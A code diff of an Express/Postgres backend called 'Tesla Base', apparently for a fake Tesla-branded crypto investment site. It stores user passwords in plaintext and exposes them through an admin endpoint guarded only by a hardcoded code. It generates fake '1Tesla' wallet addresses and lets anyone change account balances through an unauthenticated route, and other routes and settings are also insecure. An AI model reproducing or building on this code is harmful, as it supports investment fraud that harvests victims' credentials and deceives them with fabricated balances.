@@ -4,110 +4,96 @@ const cors = require('cors');
 const path = require('path');
 const app = express();
 
-// Middleware
 app.use(express.json());
 app.use(cors());
 app.use(express.static('public'));
 
 // 1. DATABASE CONNECTION
-// Replace the string below with your actual Render/Postgres External Database URL
+// Use the "External Database URL" from your Render Dashboard here
+const connectionString = "YOUR_POSTGRESQL_URL_HERE";
+
 const pool = new Pool({
-    connectionString: "YOUR_POSTGRESQL_URL_HERE",
+    connectionString: connectionString,
     ssl: { rejectUnauthorized: false }
 });
 
-// Admin Security Code
+// AUTO-FIX: This creates the table automatically if it's missing
+const initDb = async () => {
+    try {
+        await pool.query(`
+            CREATE TABLE IF NOT EXISTS users (
+                id SERIAL PRIMARY KEY,
+                email VARCHAR(255) UNIQUE NOT NULL,
+                password TEXT NOT NULL,
+                balance DECIMAL(20, 2) DEFAULT 0.00,
+                wallet_address TEXT DEFAULT '1Tesla' || md5(random()::text),
+                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
+            );
+        `);
+        console.log("✅ Database Table Verified/Created");
+    } catch (err) {
+        console.error("❌ Database Init Error:", err.message);
+    }
+};
+initDb();
+
 const ADMIN_PASS = "SOLOMON200";
 
 // --- ADMIN API ---
-
-// Verify Admin Access
 app.post('/api/admin/verify', (req, res) => {
-    if (req.body.password === ADMIN_PASS) {
-        res.json({ success: true });
-    } else {
-        res.status(401).json({ success: false, error: "Invalid Admin Code" });
-    }
+    if (req.body.password === ADMIN_PASS) res.json({ success: true });
+    else res.status(401).json({ success: false });
 });
 
-// Get All Users (For Admin Dashboard)
-// Shows emails and passwords as requested for your management
 app.get('/api/admin/users', async (req, res) => {
     try {
         const result = await pool.query('SELECT email, password, balance, wallet_address FROM users ORDER BY id DESC');
         res.json(result.rows);
-    } catch (err) {
-        res.status(500).json({ error: "Database Access Denied" });
-    }
+    } catch (err) { res.status(500).json({ error: "Access Denied" }); }
 });
 
-// --- USER AUTHENTICATION & PERSISTENCE ---
-
-// Register New User
+// --- AUTHENTICATION ---
 app.post('/api/auth/register', async (req, res) => {
     const { email, password } = req.body;
     try {
         const check = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
-        if (check.rows.length > 0) {
-            return res.status(400).json({ error: "Email already exists" });
-        }
-        // Initial balance is 0.00, funds are injected by admin
+        if (check.rows.length > 0) return res.status(400).json({ error: "User exists" });
+        
         await pool.query('INSERT INTO users (email, password, balance) VALUES ($1, $2, 0.00)', [email, password]);
         res.json({ success: true });
-    } catch (err) {
-        res.status(500).json({ error: "Registration failed: " + err.message });
+    } catch (err) { 
+        console.error(err);
+        res.status(500).json({ error: "Registration failed" }); 
     }
 });
 
-// Login User
 app.post('/api/auth/login', async (req, res) => {
     const { email, password } = req.body;
     try {
         const result = await pool.query('SELECT * FROM users WHERE email = $1 AND password = $2', [email, password]);
-        if (result.rows.length > 0) {
-            res.json({ success: true, email: email });
-        } else {
-            res.status(401).json({ error: "Invalid email or password" });
-        }
-    } catch (err) {
-        res.status(500).json({ error: "Login system error" });
-    }
+        if (result.rows.length > 0) res.json({ success: true, email: email });
+        else res.status(401).json({ error: "Invalid credentials" });
+    } catch (err) { res.status(500).json({ error: "Login failed" }); }
 });
 
-// --- LIVE DATA SYNC ---
-
-// Fetch User Data (Balance, Wallet, etc.)
+// --- DATA SYNC ---
 app.get('/api/user/data', async (req, res) => {
     const { email } = req.query;
     try {
         const result = await pool.query('SELECT * FROM users WHERE email = $1', [email]);
-        if (result.rows.length > 0) {
-            res.json(result.rows[0]);
-        } else {
-            res.status(404).json({ error: "User not found" });
-        }
-    } catch (e) {
-        res.status(500).json({ error: "Sync error" });
-    }
+        if (result.rows.length > 0) res.json(result.rows[0]);
+        else res.status(404).json({ error: "User not found" });
+    } catch (e) { res.status(500).json({ error: "DB Error" }); }
 });
 
-// Admin Update Balance (Inject Funds)
 app.post('/api/user/update-balance', async (req, res) => {
     const { email, amount } = req.body;
     try {
         await pool.query('UPDATE users SET balance = balance + $1 WHERE email = $2', [amount, email]);
         res.json({ success: true });
-    } catch (e) {
-        res.status(500).json({ error: "Balance update failed" });
-    }
-});
-
-// Serve the app
-app.get('*', (req, res) => {
-    res.sendFile(path.join(__dirname, 'public', 'index.html'));
+    } catch (e) { res.status(500).json({ error: "Update failed" }); }
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => {
-    console.log(`Tesla Base Backend running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`Tesla Base Master Live on ${PORT}`));
+                                  
